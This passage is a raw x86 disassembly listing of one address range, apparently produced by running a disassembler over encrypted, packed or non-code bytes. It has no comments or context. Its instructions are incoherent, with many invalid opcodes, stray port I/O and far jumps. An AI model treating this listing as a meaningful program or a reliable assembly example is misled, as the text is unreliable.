  40f03c:	jae    0x40f076
  40f03e:	sbb    bh,cl
  40f040:	shl    ecx,1
  40f042:	ins    BYTE PTR es:[edi],dx
  40f043:	push   ecx
  40f044:	je     0x40f040
  40f046:	xchg   esi,eax
  40f047:	mov    ch,0x3
  40f049:	mov    bh,BYTE PTR [edi]
  40f04b:	nop
  40f04c:	jge    0x40f082
  40f04e:	jmp    0x40f08f
  40f050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f051:	outs   dx,DWORD PTR ds:[esi]
  40f052:	and    BYTE PTR [edx+ebp*8+0x2c],dl
  40f056:	xor    DWORD PTR [ebx+0x73d4f604],ecx
  40f05c:	lds    edx,FWORD PTR [ebx+0x6bfa4a61]
  40f062:	pusha  
  40f063:	jge    0x40f032
  40f065:	sti    
  40f066:	inc    ebx
  40f067:	dec    esi
  40f068:	les    ebx,FWORD PTR [ebx-0x8]
  40f06b:	and    DWORD PTR ds:0xb45cc6b4,ebp
  40f071:	int3   
  40f072:	xchg   esp,eax
  40f073:	dec    esi
  40f074:	cmp    BYTE PTR [edx],dl
  40f076:	inc    esi
  40f077:	mov    eax,DWORD PTR [eax+ecx*1-0x31]
  40f07b:	leave  
  40f07c:	fidiv  DWORD PTR [edi]
  40f07e:	gs xchg edi,eax
  40f080:	jg     0x40f0b6
  40f082:	sub    BYTE PTR [edi],al
  40f084:	imul   ebp,DWORD PTR [ecx],0xffffffad
  40f087:	das    
  40f088:	pop    es
  40f089:	jns    0x40f0e7
  40f08b:	mov    ch,0x5f
  40f08d:	inc    ecx
  40f08e:	mov    bh,0x6
  40f090:	push   ebp
  40f091:	add    eax,0xb3bce78a
  40f096:	jb     0x40f03c
  40f098:	fstp   TBYTE PTR [esi]
  40f09a:	fdivr  st,st(1)
  40f09c:	xchg   ecx,eax
  40f09d:	sbb    BYTE PTR [ecx+0x48c2ea3c],al
  40f0a3:	gs jne 0x40f02c
  40f0a6:	mov    bl,0x32
  40f0a8:	lahf   
  40f0a9:	fcmove st,st(3)
  40f0ab:	or     BYTE PTR [ebx-0x74],cl
  40f0ae:	xor    ah,BYTE PTR [esi+0x79]
  40f0b1:	push   edx
  40f0b2:	outs   dx,DWORD PTR ds:[esi]
  40f0b3:	xor    eax,0x8b201500
  40f0b8:	cld    
  40f0b9:	sbb    ecx,DWORD PTR [esp+esi*8-0x31]
  40f0bd:	or     dh,cl
  40f0bf:	push   cs
  40f0c0:	retf   0x24b7
  40f0c3:	aas    
  40f0c4:	ds xor ecx,eax
  40f0c7:	mov    ebx,0xfea598c3
  40f0cc:	fistp  WORD PTR [ebx+0xb]
  40f0cf:	fs cmp al,0xfc
  40f0d2:	inc    esp
  40f0d3:	shl    BYTE PTR [edi],0xd1
  40f0d6:	test   dl,0x73
  40f0d9:	jnp    0x40f0d5
  40f0db:	cmp    BYTE PTR [eax+0x57],al
  40f0de:	pop    DWORD PTR [esi]
  40f0e0:	xor    ebp,DWORD PTR [esi+0x13]
  40f0e3:	xchg   esi,eax
  40f0e4:	xor    ebp,ebx
  40f0e6:	test   eax,0xb83fc48f
  40f0eb:	iret   
  40f0ec:	mov    bh,bh
  40f0ee:	sub    ch,ah
  40f0f0:	adc    dh,cl
  40f0f2:	stos   DWORD PTR es:[edi],eax
  40f0f3:	int    0x50
  40f0f5:	cmc    
  40f0f6:	dec    edx
  40f0f7:	mov    WORD PTR ds:0xaa5cdc72,?
  40f0fd:	mov    WORD PTR [eax],ds
  40f0ff:	rol    dl,0x15
  40f102:	test   BYTE PTR [edx+0x5fd7c04f],dh
  40f108:	mov    ds:0x7d899e82,al
  40f10d:	mov    esp,eax
  40f10f:	mov    ah,0x92
  40f111:	leave  
  40f112:	xor    BYTE PTR ds:0x85dc93e5,0x79
  40f119:	in     eax,dx
  40f11a:	dec    esp
  40f11b:	xor    BYTE PTR [edi+0x78],bl
  40f11e:	in     eax,0x45
  40f120:	sbb    bl,bh
  40f122:	mov    eax,0x3287fc02
  40f127:	popf   
  40f128:	and    al,ah
  40f12a:	fisubr DWORD PTR [esi-0x64]
  40f12d:	fwait
  40f12e:	xor    eax,0xff2bd08e
  40f134:	push   ebp
  40f135:	push   eax
  40f136:	rcl    DWORD PTR [eax],1
  40f138:	mov    esp,0x4db65092
  40f13d:	pop    edx
  40f13e:	push   ebp
  40f13f:	inc    ebp
  40f140:	dec    esi
  40f141:	add    al,0x40
  40f143:	adc    eax,0xd41d3e9
  40f148:	push   cs
  40f149:	xchg   edi,eax
  40f14a:	mov    eax,ds:0x979bee0b
  40f14f:	xlat   BYTE PTR ds:[ebx]
  40f150:	fidiv  DWORD PTR [esi+0x7c]
  40f153:	(bad)  
  40f154:	mov    eax,ds:0xd62fec7c
  40f159:	pop    esp
  40f15a:	xor    al,0x4e
  40f15c:	xlat   BYTE PTR ds:[ebx]
  40f15d:	push   ebx
  40f15e:	jno    0x40f0ff
  40f160:	xor    ebp,ebp
  40f162:	in     eax,0xb8
  40f164:	rcr    DWORD PTR [edi-0x71],0xfd
  40f168:	xor    DWORD PTR [ebx],ebp
  40f16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f16b:	sub    ebp,DWORD PTR [edi-0x53]
  40f16e:	sub    BYTE PTR [edx+0x27],ch
  40f171:	jecxz  0x40f132
  40f173:	xor    eax,0x271c090d
  40f178:	push   esp
  40f179:	and    ebp,0x6a03596d
  40f17f:	pop    ds
  40f180:	jbe    0x40f1a0
  40f182:	push   ebp
  40f183:	sub    bh,0x9c
  40f186:	cmp    BYTE PTR [ebx],ah
  40f188:	pushf  
  40f189:	inc    ebp
  40f18a:	scas   eax,DWORD PTR es:[edi]
  40f18b:	out    0xa4,eax
  40f18d:	das    
  40f18e:	(bad)  [edi-0xe]
  40f191:	jae    0x40f127
  40f193:	xchg   ecx,eax
  40f194:	jae    0x40f1d3
  40f196:	dec    eax
  40f197:	call   0x302527b3
  40f19c:	mov    ah,0x7
  40f19e:	sbb    al,BYTE PTR [edx+0x42]
  40f1a1:	call   0x99711fd8
  40f1a6:	cmp    BYTE PTR [eax],al
  40f1a8:	jne    0x40f1f7
  40f1aa:	cmp    al,0x6b
  40f1ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1ad:	xlat   BYTE PTR ds:[ebx]
  40f1ae:	jmp    0x40f161
  40f1b0:	cmc    
  40f1b1:	sahf   
  40f1b2:	sub    DWORD PTR [edi],0x5d
  40f1b5:	test   DWORD PTR [eax+0x63],eax
  40f1b8:	stos   BYTE PTR es:[edi],al
  40f1b9:	sar    DWORD PTR fs:0x6bcc1032,cl
  40f1c0:	lds    edx,FWORD PTR [edx+0x9]
  40f1c3:	push   esp
  40f1c4:	mov    al,0x24
  40f1c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1c7:	div    DWORD PTR [edx+0x6d0c76fc]
  40f1cd:	lock (bad) 
  40f1cf:	fcomp  st(3)
  40f1d1:	pop    edx
  40f1d2:	jp     0x40f180
  40f1d4:	jae    0x40f1ef
  40f1d6:	gs adc eax,0xc7e8374c
  40f1dc:	sub    DWORD PTR [edi],edx
  40f1de:	mov    esi,0xf126ca3d
  40f1e3:	cmp    BYTE PTR [edi],ah
  40f1e5:	cmp    eax,0x4152750c
  40f1ea:	or     ecx,0xffffff95
  40f1ed:	mov    ebx,0x46fbd68a
  40f1f2:	adc    al,0x6c
  40f1f4:	dec    ebx
  40f1f5:	cld    
  40f1f6:	test   DWORD PTR [ebp-0x708500a],esp
  40f1fc:	imul   esp,DWORD PTR [eax+edi*4],0x62
  40f200:	shr    ch,cl
  40f202:	or     al,0x7
  40f204:	and    eax,0xd5406098
  40f209:	int3   
  40f20a:	nop
  40f20b:	jmp    0x958ce35d
  40f210:	(bad)  
  40f211:	push   ss
  40f212:	ret    
  40f213:	add    ebp,DWORD PTR [ecx]
  40f215:	add    eax,0x620a1987
  40f21a:	push   ds
  40f21b:	cmc    
  40f21c:	lock daa 
  40f21e:	mov    bl,0x69
  40f220:	out    0xa1,eax
  40f222:	jg     0x40f287
  40f224:	add    BYTE PTR [ecx+0x134cc708],dh
  40f22a:	jo     0x40f274
  40f22c:	push   esp
  40f22d:	mov    edx,0xbf38ef44
  40f232:	ins    DWORD PTR es:[edi],dx
  40f233:	pushf  
  40f234:	leave  
  40f235:	bound  ecx,QWORD PTR [edx-0x24]
  40f238:	fisub  DWORD PTR [ebx]
  40f23a:	cs loope 0x40f1e2
  40f23d:	adc    eax,0xf562fd25
  40f242:	in     al,0x8d
  40f244:	retf   
  40f245:	pop    ds
  40f246:	arpl   WORD PTR [esi],dx
  40f248:	xor    eax,0xcc78a8c0
  40f24d:	je     0x40f271
  40f24f:	aas    
  40f250:	mov    ecx,0xe945863c
  40f255:	sub    eax,0xd2e57539
  40f25a:	push   esi
  40f25b:	sbb    bl,bl
  40f25d:	aaa    
  40f25e:	push   ds
  40f25f:	push   edi
  40f260:	and    BYTE PTR [eax+0x70df3b],0xee
  40f267:	jecxz  0x40f1fb
  40f269:	sub    esp,esp
  40f26b:	icebp  
  40f26c:	jnp    0x40f213
  40f26e:	jle    0x40f238
  40f270:	in     eax,0x19
  40f272:	(bad)  
  40f274:	(bad)  
  40f275:	int3   
  40f276:	repnz mov eax,0x8ef2b263
  40f27c:	and    al,0xc6
  40f27e:	hlt    
  40f27f:	adc    ebx,DWORD PTR [ecx+ebx*8]
  40f282:	mov    al,ds:0x75646405
  40f287:	fs cmp al,0x8b
  40f28a:	test   DWORD PTR [esi],eax
  40f28c:	test   DWORD PTR [edi+0x6ee51cac],0x22586236
  40f296:	xchg   esi,eax
  40f297:	push   ds
  40f298:	mov    esi,0x9c8e04ea
  40f29d:	fs pop ecx
  40f29f:	in     eax,dx
  40f2a0:	bound  edx,QWORD PTR ss:[ebx-0x6d1c3e19]
  40f2a7:	imul   ebx,DWORD PTR [edx-0x2bb271d6],0x54
  40f2ae:	dec    esp
  40f2af:	lds    ecx,FWORD PTR [esi-0x17]
  40f2b2:	lods   al,BYTE PTR ds:[esi]
  40f2b3:	and    eax,0x6837fea7
  40f2b8:	jmp    0x4c5b:0x7b5005f4
  40f2bf:	lods   eax,DWORD PTR ds:[esi]
  40f2c0:	push   cs
  40f2c1:	out    dx,al
  40f2c2:	add    al,0xab
  40f2c4:	aad    0x8b
  40f2c6:	xor    ah,ch
  40f2c8:	xlat   BYTE PTR ds:[ebx]
  40f2c9:	retf   
  40f2ca:	call   0xd9b2:0x4cefe448
  40f2d1:	jne    0x40f2b5
  40f2d3:	mov    bh,0xb8
  40f2d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d6:	addr16 shl bl,1
  40f2d9:	rcr    DWORD PTR ds:0x2741eb36,1
  40f2df:	inc    edx
  40f2e0:	cwde   
  40f2e1:	push   ebp
  40f2e2:	inc    esi
  40f2e3:	out    0xd9,eax
  40f2e5:	call   0xf8f9:0x40b57091
  40f2ec:	mov    eax,ds:0x38d2452
  40f2f1:	mov    eax,0xd555d750
  40f2f6:	in     eax,dx
  40f2f7:	fwait
  40f2f8:	xor    eax,0xbd533364
  40f2fd:	call   FWORD PTR [edi-0x4f9de5fa]
  40f303:	pushf  
  40f304:	data16 mov WORD PTR [edx-0x3967e7e3],ss
  40f30b:	mov    eax,0xc0b1e9a8
  40f310:	mov    esi,0x83c6593d
  40f315:	loopne 0x40f345
  40f317:	lock adc ah,BYTE PTR [edi-0x53023df1]
  40f31e:	hlt    
  40f31f:	mov    ch,0x1f
  40f321:	sbb    edx,DWORD PTR [edx]
  40f323:	pop    eax
  40f324:	aam    0x1b
  40f326:	or     eax,esi
  40f328:	mov    DWORD PTR [esi+ebx*4-0x5f],ebx
  40f32c:	cmp    BYTE PTR [eax],ah
  40f32e:	inc    edx
  40f32f:	outs   dx,BYTE PTR ds:[esi]
  40f330:	pop    ebp
  40f331:	jecxz  0x40f2ed
  40f333:	shl    BYTE PTR [edx+esi*4],0x97
  40f337:	sbb    bl,BYTE PTR [eax+0x26]
  40f33a:	ret    0xe138
  40f33d:	xchg   ecx,eax
  40f33e:	cwde   
  40f33f:	or     dh,BYTE PTR [eax+eiz*4]
  40f342:	daa    
  40f343:	xor    eax,0xcf4cdc56
  40f348:	and    WORD PTR [ebx-0x33],si
  40f34c:	aas    
  40f34d:	dec    edx
  40f34e:	mov    ebx,0xbc93e97d
  40f353:	push   0x14
  40f355:	mov    ch,0xb1
  40f357:	add    al,0xa3
  40f359:	pop    esi
  40f35a:	xor    BYTE PTR [esp+eax*4],ch
  40f35d:	in     eax,dx
  40f35e:	shl    BYTE PTR [ecx-0x6682ecb2],0x8a
  40f365:	mov    dh,0x70
  40f367:	retf   
  40f368:	push   ebx
  40f369:	pushf  
  40f36a:	jno    0x40f3b3
  40f36c:	pop    ebp
  40f36d:	xchg   BYTE PTR [ebx],cl
  40f36f:	in     al,dx
  40f370:	jp     0x40f3dd
  40f372:	pop    esp
  40f373:	or     bl,dh
  40f375:	mov    edi,DWORD PTR [ecx]
  40f377:	push   cs
  40f378:	test   DWORD PTR [edx+edi*2],0x4b0de9c5
  40f37f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f380:	and    DWORD PTR [edx+ecx*2+0x2964dc97],0xffffffaa
  40f388:	shl    edx,1
  40f38a:	mov    ds:0xf6eceee5,al
  40f38f:	ret    
  40f390:	mov    dl,BYTE PTR [ecx+esi*8]
  40f393:	and    eax,0xccdd5ccb
  40f398:	imul   edx,DWORD PTR cs:[ecx+0x63],0xfbfd4355
  40f3a0:	bound  ecx,QWORD PTR [ecx+0x436bcae2]
  40f3a6:	push   ecx
  40f3a7:	mov    dh,bh
  40f3a9:	lods   al,BYTE PTR ds:[esi]
  40f3aa:	jecxz  0x40f37d
  40f3ac:	(bad)  
  40f3ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ae:	sub    eax,0xe39ade5a
  40f3b3:	aaa    
  40f3b4:	mov    es:0x4c9b55ae,eax
  40f3ba:	inc    esi
  40f3bb:	out    0xdf,al
  40f3bd:	adc    bl,BYTE PTR [eax]
  40f3bf:	popf   
  40f3c0:	sbb    ecx,DWORD PTR [eax]
  40f3c2:	sti    
  40f3c3:	pop    ebp
  40f3c4:	les    ecx,FWORD PTR [ecx+0x7]
  40f3c7:	fldenv [ebx+0xa]
  40f3ca:	ffree  st(4)
  40f3cc:	dec    ebp
  40f3cd:	rol    BYTE PTR [ebx],0xd3
  40f3d0:	pop    ds
  40f3d1:	sbb    edx,DWORD PTR [edx-0x19d440fa]
  40f3d7:	sahf   
  40f3d8:	jg     0x40f42d
  40f3da:	repz sbb bh,cl
  40f3dd:	mov    eax,0xafef792d
  40f3e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3e3:	(bad)  
  40f3e4:	into   
  40f3e5:	dec    DWORD PTR [ebx]
  40f3e7:	push   edi
  40f3e8:	xor    edx,edx
  40f3ea:	sahf   
  40f3eb:	loopne 0x40f3d7
  40f3ed:	loop   0x40f464
  40f3ef:	pop    es
  40f3f0:	inc    ecx
  40f3f1:	add    al,0x3b
  40f3f3:	cmp    BYTE PTR [esi],dh
  40f3f5:	mov    edi,0xb8f6c0ff
  40f3fa:	jae    0x40f3a5
  40f3fc:	and    eax,edx
  40f3fe:	bound  ecx,QWORD PTR [edi+0x69]
  40f401:	ror    BYTE PTR [esi],cl
  40f403:	inc    esp
  40f404:	fisub  WORD PTR [esp+edi*4+0x8]
  40f408:	mov    bl,0x1e
  40f40a:	jl     0x40f3ee
  40f40c:	in     eax,dx
  40f40d:	jle    0x40f395
  40f40f:	and    edi,DWORD PTR [ebx]
  40f411:	sub    al,0x1f
  40f413:	cwde   
  40f414:	xchg   esp,eax
  40f415:	cmp    al,0x94
  40f417:	jecxz  0x40f429
  40f419:	daa    
  40f41a:	out    0x21,eax
  40f41c:	fldenv [ecx-0x18]
  40f41f:	jg     0x40f3e4
  40f421:	mul    BYTE PTR ds:[edi+0x62]
  40f425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f426:	(bad)  
  40f427:	enter  0x4f1c,0xf1
  40f42b:	in     al,0x21
  40f42d:	iret   
  40f42e:	imul   ebx,DWORD PTR [eax-0x57],0x75b39c7
  40f435:	add    dl,dl
  40f437:	(bad)  
  40f438:	fiadd  DWORD PTR [ebp+0x7a]
  40f43b:	jne    0x40f473
  40f43d:	pop    esi
  40f43e:	fistp  WORD PTR [ebx]
  40f440:	aad    0x4e
  40f442:	out    dx,eax
  40f443:	aaa    
  40f444:	pop    ecx
  40f445:	mov    ch,0xda
  40f447:	or     DWORD PTR [ebp+0x52],edx
  40f44a:	pop    ss
  40f44b:	enterw 0xff9,0x5c
  40f450:	mov    eax,0xbd148730
  40f455:	or     ebp,DWORD PTR [eax+0x43]
  40f458:	addr16 xchg bh,al
  40f45b:	imul   al
  40f45d:	fwait
  40f45e:	sbb    bl,BYTE PTR [esi+0x75]
  40f461:	mov    ds:0xc4ea79bb,al
  40f466:	and    edi,DWORD PTR [ebp+0x573eb395]
  40f46c:	stc    
  40f46d:	mov    bh,0x98
  40f46f:	(bad)  
  40f471:	outs   dx,DWORD PTR ds:[esi]
  40f472:	retf   
  40f473:	or     eax,0x10833484
  40f478:	je     0x40f4e5
  40f47a:	jb     0x40f484
  40f47c:	inc    DWORD PTR [edi+0x5e]
  40f47f:	pop    ebp
  40f480:	rol    DWORD PTR [esi+0x3c],0x50
  40f484:	ins    DWORD PTR es:[edi],dx
  40f485:	jmp    0x40f4f3
  40f487:	imul   edx,DWORD PTR [edi],0xaeeefbde
  40f48d:	call   0x1aa5cc53
  40f492:	stc    
  40f493:	shl    cl,0x1b
  40f496:	stos   BYTE PTR es:[edi],al
  40f497:	mov    esp,0xa371dc90
  40f49c:	jo     0x40f48b
  40f49e:	and    eax,0x23fb7ce8
  40f4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a4:	add    al,0x6d
  40f4a6:	adc    bh,ch
  40f4a8:	iret   
  40f4a9:	xchg   ebp,eax
  40f4aa:	test   eax,0xe109e432
  40f4af:	out    dx,eax
  40f4b0:	fstp   TBYTE PTR [ecx]
  40f4b2:	jne    0x40f517
  40f4b4:	test   eax,0x2c48dcea
  40f4b9:	ret    
  40f4ba:	scas   al,BYTE PTR es:[edi]
  40f4bb:	mov    eax,ds:0x41b07441
  40f4c0:	sub    esp,edi
  40f4c2:	cmp    eax,0x69b6d204
  40f4c7:	pop    es
  40f4c8:	nop
  40f4c9:	and    BYTE PTR [ebx],dl
  40f4cb:	adc    DWORD PTR [esi-0x26f55697],0x9df710fa
  40f4d5:	popf   
  40f4d6:	push   edx
  40f4d7:	cwde   
  40f4d8:	icebp  
  40f4d9:	(bad)  
  40f4da:	arpl   WORD PTR [ecx-0x7e],di
  40f4dd:	shl    DWORD PTR [ecx],1
  40f4df:	bound  edi,QWORD PTR [edx+esi*4+0x66]
  40f4e3:	inc    edi
  40f4e4:	and    edx,DWORD PTR ds:0x89d4c8c4
  40f4ea:	gs mov al,0x57
  40f4ed:	pop    ebp
  40f4ee:	and    bh,BYTE PTR [eax+0x9acba5a]
  40f4f4:	jg     0x40f562
  40f4f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4f7:	sbb    al,0xe
  40f4f9:	jmp    0xf5376f6
  40f4fe:	cs push ds
  40f500:	loopne 0x40f4a4
  40f502:	loop   0x40f561
  40f504:	dec    ebp
  40f505:	push   edx
  40f506:	mov    BYTE PTR [ecx-0x4e1d110],ch
  40f50c:	xchg   ebp,eax
  40f50d:	dec    ecx
  40f50e:	mov    ah,0x72
  40f510:	in     al,0x6b
  40f512:	leave  
  40f513:	int    0x38
  40f515:	lds    ecx,FWORD PTR [esi]
  40f517:	xchg   BYTE PTR [eax],ah
  40f519:	push   esi
  40f51a:	inc    ebp
  40f51b:	je     0x40f523
  40f51d:	sahf   
  40f51e:	fdiv   DWORD PTR [edi]
  40f520:	das    
  40f521:	xchg   esi,eax
  40f522:	mov    ch,0x38
  40f524:	mov    bh,ch
  40f526:	push   esi
  40f527:	leave  
  40f528:	dec    esi
  40f529:	cmc    
  40f52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f52b:	xchg   ebp,eax
  40f52c:	mov    dl,0x83
  40f52e:	je     0x40f54e
  40f530:	or     edx,DWORD PTR [ebx+esi*4]
  40f533:	jo     0x40f59f
  40f535:	(bad)  
  40f536:	rol    DWORD PTR [esi+0x4e57f00],1
  40f53c:	aam    0xc7
  40f53e:	fs enter 0x48a4,0x72
  40f543:	xlat   BYTE PTR ds:[ebx]
  40f544:	ins    DWORD PTR es:[edi],dx
  40f545:	cli    
  40f546:	sbb    BYTE PTR [ebx-0x5e],dh
  40f549:	pop    esp
  40f54a:	mov    es:0x3108277,eax
  40f550:	call   0x496b7e55
  40f555:	into   
  40f556:	mov    ds:0xc71ba860,al
  40f55b:	adc    al,0x8a
  40f55d:	adc    DWORD PTR [eax],esi
  40f55f:	scas   al,BYTE PTR es:[edi]
  40f560:	ins    BYTE PTR es:[edi],dx
  40f561:	fwait
  40f562:	and    al,0xfa
  40f564:	clc    
  40f565:	jo     0x40f5b5
  40f567:	in     al,dx
  40f568:	nop
  40f569:	mov    eax,0xcbe45520
  40f56e:	(bad)  
  40f56f:	aam    0x30
  40f571:	fwait
  40f572:	adc    ebp,DWORD PTR [ebx+0x2de523f8]
  40f578:	neg    eax
  40f57a:	sub    eax,0x8332b11b
  40f57f:	iret   
  40f580:	ins    DWORD PTR es:[edi],dx
  40f581:	fs aas 
  40f583:	cmp    al,0xfe
  40f585:	pusha  
  40f586:	xchg   ebx,eax
  40f587:	retf   0x37d0
  40f58a:	dec    ebx
  40f58b:	xor    eax,0x8c8d6986
  40f590:	ss mov eax,0x83dc6dc8
  40f596:	addr16 clc 
  40f598:	pop    ebx
  40f599:	push   0xe3cce961
  40f59e:	sub    al,BYTE PTR [eax+ebp*1-0x3f0ab399]
  40f5a5:	hlt    
  40f5a6:	retf   
  40f5a7:	jl     0x40f5dd
  40f5a9:	out    dx,al
  40f5aa:	fsub   DWORD PTR [edx+edx*4-0x387273b3]
  40f5b1:	adc    edi,DWORD PTR [eax-0x3e055e6]
  40f5b7:	jg     0x40f602
  40f5b9:	dec    eax
  40f5ba:	jp     0x40f547
  40f5bc:	push   es
  40f5bd:	lds    ebp,FWORD PTR [edi-0x5d4ac992]
  40f5c3:	jne    0x40f58b
  40f5c5:	push   esp
  40f5c6:	fdivr  QWORD PTR [ebx]
  40f5c8:	jmp    0x40f599
  40f5ca:	cmp    eax,0xe4fe212a
  40f5cf:	jns    0x40f61f
  40f5d1:	(bad)  
  40f5d3:	cmc    
  40f5d4:	cmc    
  40f5d5:	xchg   ebx,eax
  40f5d6:	mov    DWORD PTR [esi+0x2fe3f42e],eax
  40f5dc:	pop    esp
  40f5dd:	push   edi
  40f5de:	ret    
  40f5df:	mov    ah,0x28
  40f5e1:	into   
  40f5e2:	cld    
  40f5e3:	xor    ah,ah
  40f5e5:	push   edi
  40f5e6:	sbb    eax,0xce9248fa
  40f5eb:	mov    eax,edi
  40f5ed:	imul   edi,DWORD PTR [ecx-0x44],0x1d87b1ee
  40f5f4:	call   DWORD PTR [ebx+0x244f2ba6]
  40f5fa:	(bad)  
  40f5fb:	mov    ecx,0x86148f39
  40f600:	dec    esp
  40f601:	out    0x23,eax
  40f603:	out    0x84,al
  40f605:	aas    
  40f606:	fs cld 
  40f608:	in     al,0x5f
  40f60a:	sub    DWORD PTR [edi+0x587d8aaf],ebp
  40f610:	pop    ss
  40f611:	out    0x5a,eax
  40f613:	imul   eax,DWORD PTR [esp+esi*8+0x46def7fb],0xffffff8f
  40f61b:	and    dh,0xa
  40f61e:	mov    BYTE PTR [ebx+ebx*8],al
  40f621:	inc    ecx
  40f622:	adc    ecx,eax
  40f624:	lea    ebx,[esi]
  40f626:	test   cl,0xa3
  40f629:	pop    ecx
  40f62a:	fadd   QWORD PTR [ecx]
  40f62c:	cmp    al,0xac
  40f62e:	out    dx,al
  40f62f:	ret    0xab3a
  40f632:	jmp    0xce1b875
  40f637:	sub    edi,DWORD PTR [edi+0x3c]
  40f63a:	mov    BYTE PTR [ebp+0x51],dl
  40f63d:	or     esi,DWORD PTR [ebx-0x4bd5c409]
  40f643:	cwde   
  40f644:	repnz stc 
  40f646:	cmp    dh,BYTE PTR [esi+edx*1-0x65]
  40f64a:	imul   eax,DWORD PTR [edx+ecx*4+0x3f],0x59
  40f64f:	push   ebp
  40f650:	arpl   WORD PTR [edx-0x65],di
  40f653:	lods   eax,DWORD PTR ds:[esi]
  40f654:	adc    DWORD PTR [edx+0x1b4ac34],ecx
  40f65a:	xlat   BYTE PTR ds:[ebx]
  40f65b:	hlt    
  40f65c:	push   0xffffffe0
  40f65e:	ds ret 0x71bc
  40f662:	mov    edx,0xbb84dada
  40f667:	mov    eax,0x75efd189
  40f66c:	mov    dh,0xc0
  40f66e:	xchg   esi,eax
  40f66f:	mov    edx,0x14ca5504
  40f674:	imul   esp,DWORD PTR [ebx],0xffffffc7
  40f677:	sub    al,0x81
  40f679:	pop    esi
  40f67a:	xor    ebp,edx
  40f67c:	push   eax
  40f67d:	pop    ecx
  40f67e:	loopne 0x40f6d6
  40f680:	add    al,BYTE PTR [edi]
  40f682:	arpl   WORD PTR [edi+0x3d],ax
  40f685:	pop    esp
  40f686:	push   edx
  40f687:	jb     0x40f6f8
  40f689:	jns    0x40f6fd
  40f68b:	push   ecx
  40f68c:	cdq    
  40f68d:	inc    edi
  40f68e:	int3   
  40f68f:	stos   DWORD PTR es:[edi],eax
  40f690:	aam    0xcf
  40f692:	push   0x39
  40f694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f695:	cmp    ah,al
  40f697:	pop    eax
  40f698:	mov    cs,WORD PTR [ecx-0x5d0d3f60]
  40f69e:	(bad)  
  40f69f:	call   0x13936e78
  40f6a4:	ffree  st(0)
  40f6a6:	jae    0x40f690
  40f6a8:	sub    ebx,edx
  40f6aa:	sbb    dh,BYTE PTR [ebx+0x3b]
  40f6ad:	lods   al,BYTE PTR ds:[esi]
  40f6ae:	fmulp  st(5),st
  40f6b0:	mov    ?,WORD PTR [edi]
  40f6b2:	mov    cl,ah
  40f6b4:	sub    DWORD PTR [esi+0x5bc27534],eax
  40f6ba:	jbe    0x40f730
  40f6bc:	data16 sbb cl,0x26
  40f6c0:	sbb    eax,0xf91749ca
  40f6c5:	sub    BYTE PTR fs:[ebp-0x30a01607],dh
  40f6cc:	enter  0x9d3d,0x2b
  40f6d0:	jp     0x40f6ba
  40f6d2:	aad    0x8d
  40f6d4:	mov    ebx,DWORD PTR [ecx-0x4c44e1a0]
  40f6da:	cmp    ecx,DWORD PTR [eax]
  40f6dc:	push   ebp
  40f6dd:	int3   
  40f6de:	push   ds
  40f6df:	jne    0x40f6a5
  40f6e1:	icebp  
  40f6e2:	(bad)  
  40f6e3:	xrelease mov BYTE PTR [ebp+0x5d375419],dh
  40f6ea:	repnz pop edi
  40f6ec:	sub    DWORD PTR [ebp+0x360702f],esp
  40f6f2:	xor    edi,esi
  40f6f4:	and    BYTE PTR [edx+0x44],dl
  40f6f7:	pop    eax
  40f6f8:	sbb    edx,DWORD PTR [edi-0x39]
  40f6fb:	out    dx,al
  40f6fc:	sbb    BYTE PTR [ebp+0x7d],ah
  40f6ff:	sub    ebp,DWORD PTR [eax]
  40f701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f702:	pop    eax
  40f703:	jg     0x40f742
  40f705:	and    edi,edi
  40f707:	or     BYTE PTR [eax+ecx*8+0x3f096266],cl
  40f70e:	cmp    DWORD PTR [eax+0x10],edx
  40f711:	push   ebx
  40f712:	push   0xb2fa13af
  40f717:	jg     0x40f76e
  40f719:	icebp  
  40f71a:	dec    ecx
  40f71b:	adc    DWORD PTR [ebx+0xf],0xfffffff6
  40f71f:	fwait
  40f720:	inc    edi
  40f721:	mov    eax,0xa3647c4c
  40f726:	fwait
  40f727:	das    
  40f728:	inc    DWORD PTR [edx+0x11230984]
  40f72e:	mov    al,0x49
  40f730:	xchg   edx,eax
  40f731:	cmp    bh,bl
  40f733:	mov    dh,0x61
  40f735:	inc    edx
  40f736:	xchg   ebp,eax
  40f737:	inc    eax
  40f738:	repnz pop edx
  40f73a:	mov    BYTE PTR [ebx],ah
  40f73c:	out    dx,eax
  40f73d:	out    dx,al
  40f73e:	dec    ebx
  40f73f:	ret    0x1e1a
  40f742:	mov    al,0xbd
  40f744:	mov    eax,0x7c68f165
  40f749:	retf   
  40f74a:	call   0x22a:0x40fe6f5
  40f751:	int3   
  40f752:	pop    edi
  40f753:	xchg   ecx,eax
  40f754:	sub    al,BYTE PTR [edi]
  40f756:	mov    al,ds:0x8400cd12
  40f75b:	add    BYTE PTR [ebx-0x13],0xa3
  40f75f:	dec    ecx
  40f760:	ins    BYTE PTR es:[edi],dx
  40f761:	test   eax,0x8ee9b370
  40f766:	fs (bad) 
  40f769:	ja     0x40f758
  40f76b:	inc    esp
  40f76c:	push   0xba3ee693
  40f771:	add    ah,BYTE PTR [eax+0x6a542f77]
  40f777:	xchg   ebx,eax
  40f778:	and    BYTE PTR [eax],bl
  40f77a:	fs add esi,edi
  40f77d:	adc    DWORD PTR [ebx-0x51],esp
  40f780:	mul    BYTE PTR [eax-0x7b]
  40f783:	xor    al,0xed
  40f785:	dec    esp
  40f786:	mov    ebp,0x6afaec88
  40f78b:	aad    0x83
  40f78d:	cld    
  40f78e:	enter  0xf257,0x96
  40f792:	in     eax,0xba
  40f794:	loope  0x40f77a
  40f796:	push   ebp
